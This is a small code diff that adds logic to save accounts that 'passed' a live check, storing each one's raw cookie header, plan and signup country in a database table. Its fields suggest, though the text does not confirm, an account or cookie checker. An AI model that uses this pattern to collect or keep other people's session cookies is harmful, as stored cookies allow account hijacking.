@@ -49,6 +49,20 @@ async function savePassedCheckAudits(
 
   const { error } = await supabase.from("live_checks").insert(rows);
 
+const cookieRows = passed.map((item) => ({
+  account_id: item.accountId || crypto.randomUUID(),
+  cookie_header: item.cookieHeader || null,
+  plan: item.plan || null,
+  country: item.countryOfSignup || null,
+  checked_at: new Date().toISOString(),
+}));
+
+const { error: cookieError } = await supabase.from("cookies").insert(cookieRows);
+
+if (cookieError) {
+  console.error("save cookies error:", cookieError.message);
+}
+  
   if (error) {
     console.error("savePassedCheckAudits error:", error.message);
   }
